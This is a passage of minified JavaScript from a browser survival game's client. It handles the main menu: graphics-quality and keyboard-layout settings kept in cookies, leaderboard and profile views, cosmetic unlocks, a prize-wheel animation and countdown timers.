                        t = 0; t < e.length; t++)
                        e[t].rarity === RARITY.FREE ? (T.unlock.crate[t] = 1,
                            T.unlock.dead[t] = 1) : (T.unlock.crate[t] = 0,
                                T.unlock.dead[t] = 0)
                }
                this.waiting = !1,
                    this.in_this_view = 0,
                    this.current_mode_score = -1,
                    this.loading = {
                        translate: {
                            x: 0,
                            y: 0
                        },
                        angle: 0,
                        img: sprite[ze.GEAR2],
                        draw: function () {
                            this.angle += 2 * qe,
                                u.save(),
                                u.translate(this.translate.x + this.img.width / 2, this.translate.y + this.img.height / 2),
                                u.rotate(this.angle),
                                Ke(u, this.img, -this.img.width / 2, -this.img.height / 2),
                                u.restore()
                        }
                    },
                    this.langselect = {
                        id: document.getElementById("langselect"),
                        style: document.getElementById("langselect").style,
                        translate: {
                            x: 0,
                            y: 0
                        },
                        update: function () {
                            this.style.left = Math.floor(this.translate.x) + "px",
                                this.style.top = Math.floor(this.translate.y) + "px"
                        }
                    },
                    this.bread = 0,
                    this.previous_bread = -1,
                    this.bread_img = void 0,
                    this.new_nickname = "",
                    this.previous_new_nickname = "",
                    this.new_nickname_img = void 0,
                    this.lvl = 0,
                    this.previous_lvl = -1,
                    this.lvl_img = void 0,
                    this.xp = 0,
                    this.xp_dest = 0,
                    this.firstName = 0,
                    this.kill = 0,
                    this.death = 0,
                    this.time = 0,
                    this.score = 0,
                    this.scoreTotal = 0,
                    this.bestKill = 0,
                    this.bestTime = 0,
                    this.bestScore = 0,
                    this.seasons = [],
                    this.kit = -1,
                    this.previous_kit_hour = -1,
                    this.previous_kit_min = -1,
                    this.kit_img_min = void 0,
                    this.kit_img_hour = void 0,
                    this.privateServerTime = -1,
                    this.previous_privateServerTime_day = -1,
                    this.previous_privateServerTime_hour = -1,
                    this.previous_privateServerTime_min = -1,
                    this.privateServerTime_img_min = void 0,
                    this.privateServerTime_img_hour = void 0,
                    this.privateServerTime_img_day = void 0,
                    this.cosmetic_name = void 0,
                    this.cosmetic_author = void 0,
                    this.leaderboard_range = void 0,
                    this.leaderboard_mode = void 0,
                    this.leaderboard_sorted = void 0,
                    this.leaderboard_season = void 0,
                    this.profile_season = 3,
                    this.breath = 0,
                    this.settings = !1,
                    this.quality = Cookies.get("starve_quality") ? Cookies.get("starve_quality") : "high",
                    "high" === this.quality ? (document.getElementById("high_ing").style.backgroundColor = "#B56D18",
                        document.getElementById("low_ing").style.backgroundColor = "#3A2A0D",
                        this.quality = 1) : (document.getElementById("low_ing").style.backgroundColor = "#B56D18",
                            document.getElementById("high_ing").style.backgroundColor = "#3A2A0D",
                            this.quality = 0),
                    this.high_quality = function () {
                        document.getElementById("high_ing").style.backgroundColor = "#B56D18",
                            document.getElementById("low_ing").style.backgroundColor = "#3A2A0D",
                            Cookies.set("starve_quality", "high", {
                                expires: 30
                            }),
                            document.getElementById("input_ratio").value = 1,
                            Je.change_ratio(),
                            Se.quality = 1
                    }
                    ,
                    this.low_quality = function () {
                        document.getElementById("high_ing").style.backgroundColor = "#3A2A0D",
                            document.getElementById("low_ing").style.backgroundColor = "#B56D18",
                            Cookies.set("starve_quality", "low", {
                                expires: 30
                            }),
                            document.getElementById("input_ratio").value = .5 / (me / De),
                            Je.change_ratio(),
                            Se.quality = 0
                    }
                    ,
                    void 0 === Cookies.get("starve_mapping") && "FR" === ve ? (Ao.set_azerty(),
                        this.mapping = "azerty") : this.mapping = Cookies.get("starve_mapping") ? Cookies.get("starve_mapping") : "qwerty",
                    "azerty" == this.mapping ? (Ao.set_azerty(),
                        document.getElementById("azerty_ing").style.backgroundColor = "#B56D18",
                        document.getElementById("qwerty_ing").style.backgroundColor = "#3A2A0D") : (document.getElementById("qwerty_ing").style.backgroundColor = "#B56D18",
                            document.getElementById("azerty_ing").style.backgroundColor = "#3A2A0D"),
                    this.set_azerty = function () {
                        Ao.set_azerty(),
                            document.getElementById("azerty_ing").style.backgroundColor = "#B56D18",
                            document.getElementById("qwerty_ing").style.backgroundColor = "#3A2A0D",
                            Cookies.set("starve_mapping", "azerty", {
                                expires: 30
                            })
                    }
                    ,
                    this.set_qwerty = function () {
                        Ao.set_qwerty(),
                            document.getElementById("azerty_ing").style.backgroundColor = "#3A2A0D",
                            document.getElementById("qwerty_ing").style.backgroundColor = "#B56D18",
                            Cookies.set("starve_mapping", "qwerty", {
                                expires: 30
                            })
                    }
                    ,
                    this.all_rights_reserved = {
                        id: document.getElementById("all_rights_reserved"),
                        style: document.getElementById("all_rights_reserved").style,
                        translate: {
                            x: 0,
                            y: 0
                        },
                        update: function () {
                            this.style.left = this.translate.x + "px",
                                this.style.top = Math.floor(this.translate.y) + "px"
                        }
                    },
                    w(),
                    this.unlock = {},
                    this.unlock.skin = [],
                    this.unlock.bag = [],
                    this.unlock.book = [],
                    this.unlock.crate = [],
                    this.unlock.dead = [],
                    this.unlock.accessory = [],
                    this.day_mode = 0,
                    (this.unlock_cosmetics = W)(),
                    this.trevda = {
                        id: document.getElementById("trevda"),
                        style: document.getElementById("trevda").style,
                        translate: {
                            x: 0,
                            y: 0
                        },
                        update: function () {
                            this.style.left = this.translate.x + "px",
                                this.style.top = Math.floor(this.translate.y) + "px"
                        }
                    };
                var V, k = 0, K = function () {
                    T.update(),
                        30 == ++k ? (T.add_event_listener(),
                            T.in_this_view = !0,
                            T.update()) : window.setTimeout(K, 33)
                }, n = (this.quit = function (e) {
                    V = e,
                        T.remove_event_listener(),
                        T.in_this_view = 0,
                        n = -1,
                        U()
                }
                    ,
                    -1), U = function () {
                        T.update(),
                            30 == ++n ? (Cookies.set("starve_nickname", T.nickname.input.value, {
                                expires: 30
                            }),
                                T.nickname.style.display = "none",
                                T.server_list.style.display = "none",
                                T.langselect.style.display = "none",
                                T.all_rights_reserved.style.display = "none",
                                T.trevda.style.display = "none",
                                T.stop(),
                                V()) : window.setTimeout(U, 33)
                    }, e = (this.is_run = !1,
                        this.stop = function () {
                            this.is_run = !1
                        }
                        ,
                        this.run = function () {
                            B2(),
                                document.getElementById("game_body").style.backgroundColor = ze.GROUND[uo.time],
                                T.nickname.style.display = "inline-block",
                                T.server_list.style.display = "inline-block",
                                T.langselect.style.display = "inline-block",
                                T.all_rights_reserved.style.display = "inline-block",
                                T.trevda.style.display = "inline-block",
                                T.waiting = !1,
                                T.is_run = !0,
                                n = -1,
                                k = 0,
                                K()
                        }
                        ,
                        this.update_component = function (e, t) {
                            t = t < 0 ? -t : t,
                                (e.position & a) === a ? (e.position & i) === i ? e.translate.x = ye + e.translate._x - t : (e.position & r) === r ? e.translate.x = ye + e.translate._x + t : e.translate.x = ye + e.translate._x : (e.position & i) === i ? e.translate.x = e.translate._x - t : (e.position & r) === r ? e.translate.x = Le - e.translate._x + t : e.translate.x = e.translate._x,
                                (e.position & re) === re ? (e.position & o) === o ? e.translate.y = He + e.translate._y - t : (e.position & ne) === ne ? e.translate.y = He + e.translate._y + t : e.translate.y = He + e.translate._y : (e.position & o) === o ? e.translate.y = e.translate._y - t : (e.position & ne) === ne ? e.translate.y = Ge + e.translate._y + t : e.translate.y = e.translate._y,
                                void 0 !== e.style && (e.style.left = Math.floor(e.translate.x) + "px",
                                    e.style.top = Math.floor(e.translate.y) + "px")
                        }
                        ,
                        this.update = function () {
                            var e = 0;
                            30 == k && -1 == n || (30 != k && (e = 1500 / (k + 1) - 50),
                                -1 != n && (e = -(1750 / (30 - n + 1) - 48)));
                            for (var t, i = 0; i < this.bkgd.length; i++)
                                this.update_component(this.bkgd[i], e);
                            for (i = 0; i < this.buttons.length; i++)
                                this.update_component(this.buttons[i].info, e);
                            for (i = 0; i < this.css.length; i++)
                                this.update_component(this.css[i], e);
                            this.loading.translate.x = (Le - this.loading.img.width) / 2,
                                this.loading.translate.y = 0,
                                this.langselect.translate.x = Le - 450,
                                this.langselect.translate.y = Ge - 40,
                                this.all_rights_reserved.translate.x = Le - 340,
                                this.all_rights_reserved.translate.y = Ge - 25,
                                this.trevda.translate.x = Le - 320,
                                this.trevda.translate.y = 80,
                                30 == k && -1 == n || (t = -1 != n ? -(1750 / (30 - n + 1) - 48) : 30 != k ? 1500 / (k + 1) - 50 : 0,
                                    this.loading.translate.y -= 0 < t ? t : -t,
                                    this.langselect.translate.y -= t < 0 ? t : -t,
                                    this.all_rights_reserved.translate.y -= t < 0 ? t : -t),
                                this.langselect.update(),
                                this.all_rights_reserved.update(),
                                this.trevda.update()
                        }
                        ,
                        this.create_spin = function (e) {
                            var t = document.createElement("canvas")
                                , i = t.getContext("2d");
                            t.width = 342,
                                t.height = 342;
                            for (var n = -Math.PI / 2, r = 0; r < e.length; r++) {
                                var o = e[r][0]
                                    , a = e[r][1] * Math.PI / 180;
                                i.beginPath(),
                                    i.arc(171, 171, 170, n, n + a, !1),
                                    i.lineTo(171, 171),
                                    i.fillStyle = o,
                                    i.fill(),
                                    n += a
                            }
                            return t
                        }
                        ,
                        this.generate_new_nickname = function () {
                            this.new_nickname = document.getElementById("account_nickname_input").value,
                                this.new_nickname !== this.previous_new_nickname && (this.previous_new_nickname = this.new_nickname,
                                    this.new_nickname_img = Qr(this.new_nickname, "'Baloo Paaji', sans-serif", "#EFE4B4", 45, 550))
                        }
                        ,
                        this.draw = function () {
                            K0(),
                                Se.xp = Utils.lerp(Se.xp, Se.xp_dest, .03),
                                this.bkgd[LEVEL_GAUGE].translate.x = this.bkgd[0].translate.x + -72 + 165 * Se.xp,
                                this.bkgd[LEVEL_GAUGE].translate._x = this.bkgd[LEVEL_GAUGE].translate.x,
                                this.bkgd[LEVEL_GAUGE].translate.y = this.bkgd[0].translate.y + 30,
                                this.bkgd[LEVEL_GAUGE].translate._y = this.bkgd[LEVEL_GAUGE].translate.y;
                            for (var e = 2; e < this.bkgd.length; e++)
                                this.bkgd[e].active === z && this.bkgd[e].draw(u);
                            0 < (i = this.kit - Date.now()) && (t = Math.floor(i / 6e4),
                                E = Math.floor(t / 60),
                                (t %= 60) !== this.previous_kit_min && (this.previous_kit_min = t,
                                    T.kit_img_min = Qr(t = t < 10 ? "0" + t : "" + t, "'Baloo Paaji', sans-serif", "#EFE4B4", 80, 200)),
                                E !== this.previous_kit_hour && (this.previous_kit_hour = E,
                                    T.kit_img_hour = Qr(E = E < 10 ? "0" + E : "" + E, "'Baloo Paaji', sans-serif", "#EFE4B4", 80, 200)),
                                (a = this.bkgd[BAG_REMAIN_BOX]).draw(u),
                                n = this.kit_img_hour,
                                Ke(u, n, a.translate.x - n.width / 4 + 182, a.translate.y - n.height / 4 + 40, n.width / 2, n.height / 2),
                                n = this.kit_img_min,
                                Ke(u, n, a.translate.x - n.width / 4 + 251, a.translate.y - n.height / 4 + 40, n.width / 2, n.height / 2)),
                                0 < (i = this.privateServerTime - Date.now()) && (t = Math.floor(i / 6e4),
                                    E = Math.floor(t / 60),
                                    i = Math.floor(E / 24),
                                    E %= 24,
                                    (t %= 60) !== this.previous_privateServerTime_min && (this.previous_privateServerTime_min = t,
                                        T.privateServerTime_img_min = Qr(t = t < 10 ? "0" + t : "" + t, "'Baloo Paaji', sans-serif", "#EFE4B4", 80, 200)),
                                    E !== this.previous_privateServerTime_hour && (this.previous_privateServerTime_hour = E,
                                        T.privateServerTime_img_hour = Qr(E = E < 10 ? "0" + E : "" + E, "'Baloo Paaji', sans-serif", "#EFE4B4", 80, 200)),
                                    i !== this.previous_privateServerTime_day && (this.previous_privateServerTime_day = i,
                                        T.privateServerTime_img_day = Qr(i = i < 10 ? "0" + i : "" + i, "'Baloo Paaji', sans-serif", "#EFE4B4", 80, 200)),
                                    (a = this.bkgd[SERVER_REMAIN_BOX]).draw(u),
                                    n = this.privateServerTime_img_day,
                                    Ke(u, n, a.translate.x - n.width / 4 + 113, a.translate.y - n.height / 4 + 40, n.width / 2, n.height / 2),
                                    n = this.privateServerTime_img_hour,
                                    Ke(u, n, a.translate.x - n.width / 4 + 182, a.translate.y - n.height / 4 + 40, n.width / 2, n.height / 2),
                                    n = this.privateServerTime_img_min,
                                    Ke(u, n, a.translate.x - n.width / 4 + 251, a.translate.y - n.height / 4 + 40, n.width / 2, n.height / 2)),
                                (this.current_view & d) === d ? this.buttons[GAME_BUTTON].info.state = Ce : (this.current_view & O) === O ? this.buttons[LEADERBOARD_BUTTON].info.state = Ce : (this.current_view & l) === l ? this.buttons[COSMETICS_BUTTON].info.state = Ce : (this.current_view & A) === A ? this.buttons[PROFILE_BUTTON].info.state = Ce : (this.current_view & c) === c ? this.buttons[TUTORIAL_BUTTON].info.state = Ce : (this.current_view & h) === h ? this.buttons[LOGIN_BUTTON].info.state = Ce : (this.current_view & I) === I || (this.current_view & x) === x || (this.current_view & J) === J || (this.current_view & X) === X || (this.current_view & j) === j || (this.current_view & q) === q || (this.current_view & Z) === Z ? this.buttons[SHOP_BUTTON].info.state = Ce : (this.current_view & g) === g || (this.current_view & R) === R || (this.current_view & p) === p || (this.current_view & C) === C || (this.current_view & b) === b || (this.current_view & N) === N ? this.buttons[COSMETICS_BUTTON].info.state = Ce : (this.current_view & S) === S || (this.current_view & ee) === ee || (this.current_view & m) === m ? this.buttons[SERVER_BUTTON].info.state = Ce : (this.current_view & te) === te && (this.buttons[PROFILE_BUTTON].info.state = Ce),
                                (this.current_view & O) === O && (this.leaderboard_mode === this.LEADERBOARD_TOTAL ? (this.leaderboard_range = this.LEADERBOARD_ALL,
                                    this.buttons[this.LEADERBOARD_ALL].info.active = P,
                                    this.buttons[this.LEADERBOARD_WEEK].info.active = P,
                                    this.buttons[this.LEADERBOARD_TODAY].info.active = P) : (this.buttons[this.LEADERBOARD_ALL].info.active = z,
                                        this.buttons[this.LEADERBOARD_WEEK].info.active = z,
                                        this.buttons[this.LEADERBOARD_TODAY].info.active = z),
                                    this.leaderboard_mode === this.LEADERBOARD_NORMAL ? this.buttons[this.LEADERBOARD_NORMAL].info.state = Ce : this.leaderboard_mode === this.LEADERBOARD_VAMPIRE ? this.buttons[this.LEADERBOARD_VAMPIRE].info.state = Ce : this.leaderboard_mode === this.LEADERBOARD_TOTAL ? this.buttons[this.LEADERBOARD_TOTAL].info.state = Ce : this.leaderboard_mode === this.LEADERBOARD_ZOMBIE ? this.buttons[this.LEADERBOARD_ZOMBIE].info.state = Ce : this.leaderboard_mode === this.LEADERBOARD_FOREST && (this.buttons[this.LEADERBOARD_FOREST].info.state = Ce),
                                    this.leaderboard_range === this.LEADERBOARD_ALL ? this.buttons[this.LEADERBOARD_ALL].info.state = Ce : this.leaderboard_range === this.LEADERBOARD_WEEK ? this.buttons[this.LEADERBOARD_WEEK].info.state = Ce : this.leaderboard_range === this.LEADERBOARD_TODAY && (this.buttons[this.LEADERBOARD_TODAY].info.state = Ce),
                                    this.leaderboard_sorted === this.LEADERBOARD_KILL ? this.buttons[this.LEADERBOARD_KILL].info.state = Ce : this.leaderboard_sorted === this.LEADERBOARD_SCORE ? this.buttons[this.LEADERBOARD_SCORE].info.state = Ce : this.leaderboard_sorted === this.LEADERBOARD_TIME && (this.buttons[this.LEADERBOARD_TIME].info.state = Ce),
                                    this.leaderboard_season === this.LEADERBOARD_SEASON1 ? this.buttons[this.LEADERBOARD_SEASON1].info.state = Ce : this.leaderboard_season === this.LEADERBOARD_SEASON2 ? this.buttons[this.LEADERBOARD_SEASON2].info.state = Ce : this.leaderboard_season === this.LEADERBOARD_SEASON3 ? this.buttons[this.LEADERBOARD_SEASON3].info.state = Ce : this.leaderboard_season === this.LEADERBOARD_SEASON4 ? this.buttons[this.LEADERBOARD_SEASON4].info.state = Ce : this.leaderboard_season === this.LEADERBOARD_SEASON5 && (this.buttons[this.LEADERBOARD_SEASON5].info.state = Ce)),
                                (this.current_view & A) === A && (-1 === this.current_mode_score ? this.buttons[de].info.state = Ce : this.current_mode_score === Ue.MODE_PVP ? this.buttons[Te].info.state = Ce : this.current_mode_score === Ue.MODE_ZOMBIES ? this.buttons[he].info.state = Ce : this.current_mode_score === Ue.MODE_VAMPIRES ? this.buttons[le].info.state = Ce : this.current_mode_score === Ue.MODE_LEGACY && (this.buttons[Ae].info.state = Ce),
                                    0 === this.profile_season ? this.buttons[ae].info.state = Ce : 1 === this.profile_season ? this.buttons[se].info.state = Ce : 2 === this.profile_season ? this.buttons[_e].info.state = Ce : 3 === this.profile_season ? this.buttons[Ee].info.state = Ce : 4 === this.profile_season && (this.buttons[ue].info.state = Ce)),
                                (this.current_view & d) === d && 0 === client.privateServer && (this.buttons[M].in_button(je.pos) ? this.buttons[M].hint = Math.min(1, this.buttons[M].hint + 1.5 * qe) : this.buttons[M].hint = Math.max(0, this.buttons[M].hint - 1.5 * qe),
                                    this.buttons[f].in_button(je.pos) ? this.buttons[f].hint = Math.min(1, this.buttons[f].hint + 1.5 * qe) : this.buttons[f].hint = Math.max(0, this.buttons[f].hint - 1.5 * qe),
                                    this.buttons[L].in_button(je.pos) ? this.buttons[L].hint = Math.min(1, this.buttons[L].hint + 1.5 * qe) : this.buttons[L].hint = Math.max(0, this.buttons[L].hint - 1.5 * qe),
                                    this.buttons[H].in_button(je.pos) ? this.buttons[H].hint = Math.min(1, this.buttons[H].hint + 1.5 * qe) : this.buttons[H].hint = Math.max(0, this.buttons[H].hint - 1.5 * qe),
                                    this.buttons[G].in_button(je.pos) ? this.buttons[G].hint = Math.min(1, this.buttons[G].hint + 1.5 * qe) : this.buttons[G].hint = Math.max(0, this.buttons[G].hint - 1.5 * qe),
                                    this.buttons[y].in_button(je.pos) ? this.buttons[y].hint = Math.min(1, this.buttons[y].hint + 1.5 * qe) : this.buttons[y].hint = Math.max(0, this.buttons[y].hint - 1.5 * qe));
                            var t = 1;
                            for (1 < (this.current_view & (x | J | X | j | q | Z)) && (n = IMAGES.ARROW_SPIN,
                                u.save(),
                                u.translate(ye, oe + n.height / 4),
                                1 === this.spin && (this.spin_effect += qe / 3,
                                    t = this.spin_target - 100 / Math.pow(1 + this.spin_effect, 1 + this.spin_effect),
                                    u.rotate(t)),
                                Ke(u, n, -n.width / 4, -n.height / 4, n.width / 2, n.height / 2),
                                u.restore()),
                                0 === client.privateServer && (client.current_mode === Ue.MODE_PVP ? this.buttons[M].info.state = Ce : client.current_mode === Ue.MODE_LEGACY ? this.buttons[f].info.state = Ce : client.current_mode === Ue.MODE_ZOMBIES ? this.buttons[G].info.state = Ce : client.current_mode === Ue.MODE_VAMPIRES ? this.buttons[y].info.state = Ce : client.current_mode === Ue.MODE_COMMUNITY ? this.buttons[L].info.state = Ce : client.current_mode === Ue.MODE_EXPERIMENTAL && (this.buttons[H].info.state = Ce)),
                                e = 1; e < this.buttons.length; e++)
                                this.buttons[e].info.active === z && this.buttons[e].draw(u);
                            this.bkgd[0].draw(u),
                                0 < (this.current_view & ($ | Q)) && (n = this.new_nickname_img,
                                    Ke(u, n, ye - n.width / 4, 138, n.width / 2, n.height / 2));
                            var i, n, r, o, a, s, _, E = Math.max(1, Math.min(18, Math.floor((Se.lvl + 3) / 2)));
                            if (this.bkgd[E].active = z,
                                this.bkgd[E].draw(u),
                                this.bkgd[E].active = P,
                                this.buttons[0].draw(u),
                                1 < (this.current_view & (l | R | C | g | b)) && (i = 1 < (this.current_view & (R | C | g | b)) ? -190 : 0,
                                    n = sprite[ze.BAG][this.bag][this.day_mode],
                                    Ke(u, n, ye - n.width / 4 + i, 183, n.width / 2, n.height / 2),
                                    this.breath = (this.breath + 1e3 * qe) % 2e3,
                                    r = 4.5 * (this.breath < 1e3) ? this.breath / 1e3 : (2e3 - this.breath) / 1e3,
                                    n = sprite[ze.BOOK][this.book][this.day_mode],
                                    Ke(u, n, ye - n.width / 4 - 62 + r + i, 240, n.width / 2, n.height / 2),
                                    n = sprite[ze.HAND][this.skin][this.day_mode],
                                    Ke(u, n, ye - n.width / 4 - 54 + r + i, 272, n.width / 2, n.height / 2),
                                    Ke(u, n, ye - n.width / 4 + 54 - r + i, 272, n.width / 2, n.height / 2),
                                    n = sprite[ze.BODY][this.skin][this.day_mode],
                                    Ke(u, n, ye - n.width / 4 + i, 222, n.width / 2, n.height / 2),
                                    n = sprite[ze.ACCESSORY][this.accessory][this.day_mode],
                                    Ke(u, n, ye - n.width / 4 + i, 222, n.width / 2, n.height / 2)),
                                (this.current_view & l) === l && (n = sprite[ze.CRATE][this.crate][this.day_mode],
                                    Ke(u, n, ye - n.width / 4 - 61, 406 - n.height / 4, n.width / 2, n.height / 2),
                                    n = sprite[ze.CRATE][this.dead][this.day_mode],
                                    Ke(u, n, ye - n.width / 4 + 53, 406 - n.height / 4, n.width / 2, n.height / 2)),
                                (this.current_view & p) === p && (n = sprite[ze.CRATE][this.dead][this.day_mode],
                                    Ke(u, n, ye - n.width / 4 - 200, 268 - n.height / 4, n.width / 2, n.height / 2)),
                                (this.current_view & N) === N && (n = sprite[ze.CRATE][this.crate][this.day_mode],
                                    Ke(u, n, ye - n.width / 4 - 200, 268 - n.height / 4, n.width / 2, n.height / 2)),
                                1 < (this.current_view & (R | C | g | b | p | N))) {
                                for (e = 1; e < this.buttons.length; e++)
                                    0 != (this.buttons[e].view & this.current_view) && 0 <= (o = this.buttons[e].info).cosmeticId && (n = o.cosmeticType[o.cosmeticId].day,
                                        Ke(u, n, o.translate.x - n.width / 8 + 44.5, o.translate.y - n.height / 8 + 45.5, n.width / 4, n.height / 4),
                                        1 !== o.unlocked) && (n = IMAGES.RED_LOCKED,
                                            Ke(u, n, o.translate.x - n.width / 4 + 44.5, o.translate.y - n.height / 4 + 44.5, n.width / 2, n.height / 2));
                                n = this.cosmetic_name,
                                    Ke(u, n, ye - 312, 375, n.width / 2, n.height / 2),
                                    n = this.cosmetic_author,
                                    Ke(u, n, ye - 312, 395, n.width / 2, n.height / 2)
                            }
                            this.bread !== this.previous_bread && (this.previous_bread = this.bread,
                                this.bread_img = Qr("" + this.bread, "'Baloo Paaji', sans-serif", "#EFE4B4", 60, 250)),
                                Ke(u, this.bread_img, this.bkgd[0].translate.x + 350, 15, this.bread_img.w2, this.bread_img.h2),
                                this.lvl !== this.previous_lvl && (this.previous_lvl = this.lvl,
                                    this.lvl_img = Qr("LVL " + (this.lvl + 1), "'Baloo Paaji', sans-serif", "#EFE4B4", 50, 250, void 0, 30, 24, void 0, void 0, void 0, void 0, "#3F3019", 20)),
                                Ke(u, this.lvl_img, this.bkgd[0].translate.x + 94, 0, this.lvl_img.w2, this.lvl_img.h2),
                                0 === client.privateServer && (0 < (a = this.buttons[M].hint) && (n = IMAGES.NORMAL_MODE_HOVER,
                                    Ke(u, n, ye - n.width / 4, -36 - n.height * Utils.ease_in_out_quad(1 - a) / 2, n.width / 2, n.height / 2)),
                                    0 < (a = this.buttons[f].hint) && (n = IMAGES.FOREST_MODE_HOVER,
                                        Ke(u, n, ye - n.width / 4, -36 - n.height * Utils.ease_in_out_quad(1 - a) / 2, n.width / 2, n.height / 2)),
                                    0 < (a = this.buttons[L].hint) && (n = IMAGES.MODE_COMMUNITY_HOVER,
                                        Ke(u, n, ye - n.width / 4, -36 - n.height * Utils.ease_in_out_quad(1 - a) / 2, n.width / 2, n.height / 2)),
                                    0 < (a = this.buttons[H].hint) && (n = IMAGES.MODE_EXPERIMENTAL_HOVER,
                                        Ke(u, n, ye - n.width / 4, -36 - n.height * Utils.ease_in_out_quad(1 - a) / 2, n.width / 2, n.height / 2)),
                                    0 < (a = this.buttons[y].hint) && (n = IMAGES.VAMPIRE_MODE_HOVER,
                                        Ke(u, n, ye - n.width / 4, -36 - n.height * Utils.ease_in_out_quad(1 - a) / 2, n.width / 2, n.height / 2)),
                                    0 < (a = this.buttons[G].hint)) && (n = IMAGES.ZOMBIE_MODE_HOVER,
                                        Ke(u, n, ye - n.width / 4, -36 - n.height * Utils.ease_in_out_quad(1 - a) / 2, n.width / 2, n.height / 2)),
                                1 === this.spin && Math.abs(t - this.spin_target) < .006 && (u.globalAlpha = Math.min(1, 3 * this.spin_win_effect),
                                    n = IMAGES.SPIN_LIGHT,
                                    u.save(),
                                    u.translate(ye, 260),
                                    this.spin_win_effect += qe,
                                    u.rotate(this.spin_win_effect),
                                    Ke(u, n, -n.width / 2, -n.height / 2, n.width, n.height),
                                    u.restore(),
                                    r = 1.05 + .05 * Math.sin(5 * this.spin_win_effect),
                                    0 === this.spin_type ? (s = r * (n = COSMETICS.SKIN[this.spin_win].day).width,
                                        _ = r * n.height,
                                        Ke(u, n, ye - s / 2, 260 - _ / 2, s, _)) : 1 === this.spin_type ? (s = r * (n = COSMETICS.SKIN[0].day).width,
                                            _ = r * n.height,
                                            Ke(u, n, ye - s / 2, 260 - _ / 2, s, _),
                                            s = r * (n = COSMETICS.ACCESSORY[this.spin_win].day).width,
                                            _ = r * n.height,
                                            Ke(u, n, ye - s / 2, 260 - _ / 2, s, _)) : 2 === this.spin_type ? (s = r * (n = COSMETICS.BAG[this.spin_win].day).width,
                                                _ = r * n.height,
                                                Ke(u, n, ye - s / 2, 180 - _ / 2, s, _),
                                                s = r * (n = COSMETICS.SKIN[0].day).width,
                                                _ = r * n.height,
                                                Ke(u, n, ye - s / 2, 260 - _ / 2, s, _)) : 3 === this.spin_type ? (s = r * (n = COSMETICS.BOOK[this.spin_win].day).width,
                                                    _ = r * n.height,
                                                    u.save(),
                                                    u.translate(ye, 260),
                                                    u.rotate(Math.PI),
                                                    Ke(u, n, -s / 2, -_ / 2, s, _),
                                                    u.restore()) : 4 === this.spin_type && (s = r * (n = COSMETICS.CRATE[this.spin_win].day).width,
                                                        _ = r * n.height,
                                                        Ke(u, n, ye - s / 2, 260 - _ / 2, s, _)),
                                    n = this.spin_name,
                                    Ke(u, n, ye - n.width / 4, 340, n.width / 2, n.height / 2),
                                    n = this.spin_author,
                                    Ke(u, n, ye - n.width / 4, 365, n.width / 2, n.height / 2),
                                    6 < this.spin_win_effect && (this.spin = 0,
                                        v(I)),
                                    u.globalAlpha = 1),
                                xe.alert.draw("#FFF", "#000"),
                                T.waiting && this.loading.draw()
                        }
                        ,
                        0), d = Math.pow(2, e++), A = Math.pow(2, e++), h = (this.__PROFILE__ = A,
                            Math.pow(2, e++)), l = Math.pow(2, e++), I = Math.pow(2, e++), c = Math.pow(2, e++), O = Math.pow(2, e++), t = Math.pow(2, e++), Y = (this.__BUY__ = t,
                                Math.pow(2, e++)), F = Math.pow(2, e++), x = Math.pow(2, e++), J = Math.pow(2, e++), X = Math.pow(2, e++), j = Math.pow(2, e++), q = Math.pow(2, e++), Z = Math.pow(2, e++), g = Math.pow(2, e++), p = Math.pow(2, e++), R = Math.pow(2, e++), C = Math.pow(2, e++), b = Math.pow(2, e++), N = Math.pow(2, e++), Q = Math.pow(2, e++), $ = Math.pow(2, e++), S = Math.pow(2, e++), ee = (this.__SERVER_LOCATION__ = S,
                                    Math.pow(2, e++)), m = (this.__SERVER_DURATION__ = ee,
                                        Math.pow(2, e++)), te = (this.__SERVER_ACCESS__ = m,
                                            Math.pow(2, e++));
                function D(e, t, i) {
                    for (var n = 0; n < T.bkgd.length; n++)
                        0 != (T.bkgd[n].view & e) && (T.bkgd[n].active = t);
                    for (n = 0; n < T.buttons.length; n++)
                        0 != (T.buttons[n].view & e) && (T.buttons[n].info.active = t);
                    for (n = 0; n < T.css.length; n++)
                        0 != (T.css[n].view & e) && (T.css[n].style.display = i)
                }
                function ie() {
                    var e = Number(Cookies.get("starve_crate"))
                        , t = Number(Cookies.get("starve_dead"))
                        , i = Number(Cookies.get("starve_book"))
                        , n = Number(Cookies.get("starve_bag"))
                        , r = Number(Cookies.get("starve_skin"))
                        , o = Number(Cookies.get("starve_accessory"));
                    0 < Se.unlock.skin[Se.skin] || (Se.skin = 0 < Se.unlock.skin[r] ? r : 0),
                        0 < Se.unlock.book[Se.book] || (Se.book = 0 < Se.unlock.book[i] ? i : 0),
                        0 < Se.unlock.dead[Se.dead] || (Se.dead = 0 < Se.unlock.dead[t] ? t : 0),
                        0 < Se.unlock.crate[Se.crate] || (Se.crate = 0 < Se.unlock.crate[e] ? e : 0),
                        0 < Se.unlock.accessory[Se.accessory] || (Se.accessory = 0 < Se.unlock.accessory[o] ? o : 0),
                        0 < Se.unlock.bag[Se.bag] || (Se.bag = 0 < Se.unlock.bag[n] ? n : 0)
                }
                function v(e) {
                    !1 !== T.in_this_view && (D(Y, P, "none"),
                        D(F, P, "none"),
                        ie(),
                        e === T.current_view || 1 <= T.spin || (T.trevda.style.display = e === d || e === I || e === A || e === O || e === l || e === c ? "inline-block" : "none",
                            D(T.current_view, P, "none"),
                            T.current_view = e,
                            D(T.current_view, z, "inline-block")))
                }
                this.current_view = d,
                    this.select_subview = v,
                    this.play_game = function () {
                        !1 === T.waiting && (xe.reconnect.enabled = !1,
                            T.waiting = !0,
                            ie(),
                            client.connect())
                    }
                    ;
                var M, f, L, G, y, H, i = 1, r = 2, o = 4, ne = 8, a = 16, re = 32, P = 0, z = 1, s = (window.innerWidth < 1300 ? this.nickname = {
                    id: document.getElementById("nickname_block"),
                    style: document.getElementById("nickname_block").style,
                    input: document.getElementById("nickname_input"),
                    active: z,
                    position: o | i,
                    view: d,
                    translate: {
                        x: 0,
                        y: 0,
                        _x: 200,
                        _y: 184
                    }
                } : this.nickname = {
                    id: document.getElementById("nickname_block"),
                    style: document.getElementById("nickname_block").style,
                    input: document.getElementById("nickname_input"),
                    active: z,
                    position: o | a,
                    view: d,
                    translate: {
                        x: 0,
                        y: 0,
                        _x: -180,
                        _y: 184
                    }
                },
                    this.nickname.id.addEventListener("keyup", function (e) {
                        e.preventDefault(),
                            13 != e.keyCode || T.waiting || T.settings || T.play_game()
                    }),
                    this.nickname.input.value = Cookies.get("starve_nickname") ? Cookies.get("starve_nickname") : "",
                    this.account_nickname = {
                        id: document.getElementById("account_nickname_block"),
                        style: document.getElementById("account_nickname_block").style,
                        input: document.getElementById("account_nickname_input"),
                        active: P,
